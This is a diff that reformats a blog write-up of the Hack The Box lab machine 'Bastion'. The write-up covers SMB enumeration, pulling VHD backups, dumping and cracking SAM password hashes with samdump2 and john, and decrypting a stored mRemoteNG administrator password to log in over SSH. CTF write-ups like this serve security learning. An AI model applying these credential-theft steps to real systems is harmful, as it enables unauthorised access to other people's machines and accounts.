@@ -1,9 +1,8 @@
 ---
-layout: post
-title:  "Hack The Box - Bastion"
-date:   2019-09-07 23:11:00 +0800
-categories: hackthebox
-tags: smb mremoteng windows ssh
+title: Hack The Box - Bastion
+date: 2019-09-07 23:11:00 +0800
+categories: [hackthebox]
+tags: [smb, mremoteng, windows, ssh]
 ---
 I found this machine a little hard at first as this was my first Windows machine and I wasn't adept at exploiting Windows. After reading various write ups and guides online, I was able to root this machine ! :) 
 
@@ -15,14 +14,14 @@ The operating systems that I will be using to tackle this machine is a Kali Linu
 
 What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
 
-{% highlight bash %}
+```bash
 $ echo "10.10.10.134 bastion.htb" >> /etc/hosts
-{% endhighlight %}
+```
 
 # Reconnaissance
 
 Using `nmap`, we are able to determine the open ports and running services on the machine.
-{% highlight bash %}
+```bash
 $ nmap -sV -sT -sC bastion.htb
 Nmap scan report for bastion.htb (10.10.10.134)
 Host is up (0.26s latency).
@@ -61,13 +60,13 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 53.52 seconds
 
-{% endhighlight %}
+```
 
 # Enumeration (1)
 
 Not much can be done with the `ssh` service as we do not have any credentials on hand so lets come back to it later. As for the `smb` service, maybe we can try logging into it and see what we can find ?
 
-{% highlight bash %}
+```bash
 $ smbclient -L bastion.htb
 	Sharename       Type      Comment
 	---------       ----      -------
@@ -87,11 +86,11 @@ $ smbmap -H bastion.htb -U Guest
 	C$                                                	    NO ACCESS
 	IPC$                                              	    READ ONLY
 
-{% endhighlight %}
+```
 
 Alright, the `Backups` share seems interesting. Lets check it out.
 
-{% highlight bash %}
+```bash
 $ smbclient //bastion.htb/Backups
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -108,18 +107,18 @@ smb: \> ls
 
 		7735807 blocks of size 4096. 2776236 blocks available
 
-{% endhighlight %}
+```
 
 Looks like someone left a `note.txt` on the share. 
 
-{% highlight bash %}
+```bash
 smb: \> more note.txt
 Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
-{% endhighlight %}
+```
 
 At this point of time, I did not understand the meaning of this message so I simply ignored it. Another thing that caught my attention was the `WindowsImageBackup` directory.
 
-{% highlight bash %}
+```bash
 smb: \> cd WindowsImageBackup
 smb: \WindowsImageBackup\> dir
   .                                   D        0  Fri Feb 22 07:44:02 2019
@@ -137,10 +136,10 @@ smb: \WindowsImageBackup\L4mpje-PC\> dir
   SPPMetadataCache                    D        0  Fri Feb 22 07:45:32 2019
 
 		7735807 blocks of size 4096. 2776046 blocks available
-{% endhighlight %}
+```
 
 Oh no this feels like a rabbit hole already but `Backup 2019-02-22 124351` seems hopeful.
-{% highlight bash %}
+```bash
 smb: \WindowsImageBackup\L4mpje-PC\> cd "Backup 2019-02-22 124351"
 smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> dir
   .                                                                                              D          0   Fri Feb 22 07:45:32 2019
@@ -161,17 +160,17 @@ smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> dir
 
 		7735807 blocks of size 4096. 2776046 blocks available
 
-{% endhighlight %}
+```
 
 The `.vhd` files seem worth checking out. Lets try downloading them.
 
-{% highlight bash %}
+```bash
 smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> get 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
 parallel_read returned NT_STATUS_IO_TIMEOUT
 getting file \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd 
 of size 37761024 as 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd SMBecho failed (NT_STATUS_INVALID_NETWORK_RESPONSE). 
 The connection is disconnected now
-{% endhighlight %}
+```
 
 What just happened ? `NT_STATUS_IO_TIMEOUT` ? Was the file too big to be transferred ? This was where I finally understood the message when it said `don't transfer the entire backup file` and the `VPN to the subsidiary office is too slow`. Seems like we can't rely on `smbclient` to retrieve the files :/ This was where it struck me to use a Windows VM. I had heard of a Offensive Windows distribution VM by FireEye and felt that it was a good chance to try it out!
 
@@ -186,16 +185,16 @@ After downloading the `.vhd` files which tooked quite a while, I mounted both of
 Seems like a rather normal looking Windows file system. After looking through the user folders, I was not able to find anything but I found the SAM and SYSTEM files in the `Windows\System32\config` folder. Maybe we can dump out the passwords using these files ?
 
 Using the `samdump2` command, we were able to extract the account hashes.
-{% highlight bash %}
+```bash
 $ samdump2 SYSTEM SAM -o hash.txt
 $ cat hash.txt
 \*disabled\* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 \*disabled\* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
-{% endhighlight %}
+```
 
 Following up, we used `john` to cracked the NT hashes in `hash.txt` along with the `rockyou.txt` password list.
-{% highlight bash %}
+```bash
 $ john --format=nt hash.txt -wordlist:/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 2 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])
@@ -207,12 +206,12 @@ bureaulampje     (L4mpje)
 Warning: passwords printed above might not be all those cracked
 Use the "--show --format=NT" options to display all of the cracked passwords reliably
 Session completed
-{% endhighlight %}
+```
 
 # user.txt
 
 Bingo, we got it ! With the password `bureaulampje`, we will now attempt to login via `ssh` using `L4mpje`'s credentials. The `user.txt` resided on his Desktop.
-{% highlight bash %}
+```bash
 $ ssh L4mpje@bastion.htb
 L4mpje@bastion.htb's password: 
 
@@ -236,12 +235,12 @@ l4mpje@BASTION C:\Users\L4mpje\Desktop>dir
 l4mpje@BASTION C:\Users\L4mpje\Desktop>more user.txt                             
 9bfeXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 
-{% endhighlight %}
+```
 
 # Enumeration (2)
 
 As `l4mpje`, we first checked out the installed programs.
-{% highlight bash %}
+```bash
 $ dir C:\Program Files (x86)
  Volume in drive C has no label.                                                                               
  Volume Serial Number is 0CB3-C487                                                                             
@@ -265,11 +264,11 @@ $ dir C:\Program Files (x86)
                0 File(s)              0 bytes                                                                  
               14 Dir(s)  11.404.402.688 bytes free     
 
-{% endhighlight %}
+```
 
 `mRemoteNG` ? This doesn't seem like a default installed Windows program.
 
-{% highlight bash %}
+```bash
 $ dir C:\Program Files (x86)\mRemoteNG
  Volume in drive C has no label.                                                 
  Volume Serial Number is 0CB3-C487                                               
@@ -334,11 +333,11 @@ $ dir C:\Program Files (x86)\mRemoteNG
 22-02-2019  15:01    <DIR>          zh-TW                                        
               28 File(s)     17.802.352 bytes                                    
               28 Dir(s)  11.360.325.632 bytes free                               
-{% endhighlight %}
+```
 
 Lets see what version of `mRemoteNG` is installed by checking the `Changelog.txt`. 
 
-{% highlight bash %}
+```bash
 1.76.11 (2018-10-18):                                                            
 
 Fixes:                                                                           
@@ -347,7 +346,7 @@ Fixes:
 #1136: Putty window not maximized                                                
 
 ...
-{% endhighlight %}
+```
 
 Seems like the version is `1.76.10`. Lets see if we can find any exploits regarding `mRemoteNG`.
 
@@ -357,7 +356,7 @@ I came across this [post-exploitation module](https://www.rapid7.com/db/modules/
 
 The password storage file was stored in the `%appdata%\mRemoteNG`.
 
-{% highlight bash %}
+```bash
 $ dir %appdata%\mRemoteNG 
 
 22-02-2019  15:03    <DIR>          .                                                                          
@@ -440,7 +439,7 @@ tApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserFiel
 ageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGa
 tewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />                       
 </mrng:Connections> 
-{% endhighlight %}
+```
 
 In the `<Node>` element, we see :  
 ```
@@ -452,10 +451,10 @@ protocol: RDP
 
 From this, we can guess that the password field contains the encrypted version of the Administrator's password. Using the `mremoteng_decrypt.py`,
 
-{% highlight bash %}
+```bash
 $ python mremoteng_decrypt.py aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
 Password: thXLHM96BeKL0ER2
-{% endhighlight %}
+```
 
 Neat ! We got the Administrator's password !
 
@@ -463,7 +462,7 @@ Neat ! We got the Administrator's password !
 
 Lets see if we can login into the Administrator's account via `ssh`.
 
-{% highlight bash %}
+```bash
 ssh Administator@bastion.htb
 Administrator@bastion.htb's password: 
 
@@ -487,6 +486,6 @@ administrator@BASTION C:\Users\Administrator\Desktop>dir
 administrator@BASTION C:\Users\Administrator\Desktop>more root.txt               
 9588XXXXXXXXXXXXXXXXXXXXXXXXXXXX
 
-{% endhighlight %}
+```
 
-## Rooted ! Thank you for reading and look forward for more writeups and articles !
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
